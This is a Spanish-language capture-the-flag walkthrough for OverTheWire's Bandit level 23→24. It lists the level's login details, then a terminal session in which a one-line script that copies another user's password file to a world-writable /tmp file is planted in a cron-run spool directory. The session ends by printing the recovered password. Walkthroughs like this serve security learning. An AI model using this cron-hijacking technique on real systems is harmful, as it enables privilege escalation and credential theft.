## Bandit Level 23 → Level 24

## Objetivo

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
 
**Servidor**:  bandit.labs.overthewire.org
**Usuario**: bandit23
**Password**: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución

```

bandit23@bandit:~$ ls -la /etc/cron.d/
total 56
drwxr-xr-x   2 root root  4096 Feb 21 22:04 .
drwxr-xr-x 108 root root 12288 Feb 21 22:04 ..
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit22
-rw-r--r--   1 root root   122 Feb 21 22:03 cronjob_bandit23
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit24
-rw-r--r--   1 root root    62 Feb 21 22:03 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Feb 21 22:04 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat

bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls -la
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/24
bandit23@bandit:/var/spool/bandit24/foo$  cd /tmp/24
bandit23@bandit:/tmp/24$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/dark24/password" > mio.sh 
bandit23@bandit:/tmp/24$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/24/password" > mio.sh 
bandit23@bandit:/tmp/24$ chmod 777 mio.sh
bandit23@bandit:/tmp/24$ touch password
bandit23@bandit:/tmp/24$ chmod 666 password
bandit23@bandit:/tmp/24$ ls -la
total 124
drwxrwxr-x  2 bandit23 bandit23   4096 Mar  1 02:08 .
drwxrwx-wt 54 root     root     114688 Mar  1 02:08 ..
-rwxrwxrwx  1 bandit23 bandit23     50 Mar  1 02:08 mio.sh
-rw-rw-rw-  1 bandit23 bandit23      0 Mar  1 02:08 password
bandit23@bandit:/tmp/24$ cp mio.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/mio.sh': Operation not permitted
bandit23@bandit:/tmp/24$ cp mio.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/24$ cat password
bandit23@bandit:/tmp/24$ ls -la
total 124
drwxrwxr-x  2 bandit23 bandit23   4096 Mar  1 02:08 .
drwxrwx-wt 54 root     root     114688 Mar  1 02:09 ..
-rwxrwxrwx  1 bandit23 bandit23     50 Mar  1 02:08 mio.sh
-rw-rw-rw-  1 bandit23 bandit23      0 Mar  1 02:08 password
bandit23@bandit:/tmp/24$ cat password
bandit23@bandit:/tmp/24$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/24$ 

```

## Notas adicionales

* Creamos una carpeta que fue temporal, dónde se realizo un script.
* Se mando todo lo que contiene al usuario 24 a la carpeta temporal.
* Se mando el script a la ruta: **/var/spool/bandit24/mio.sh** , esta ruta se ejecutara y nos mandara el comando.

## Referencias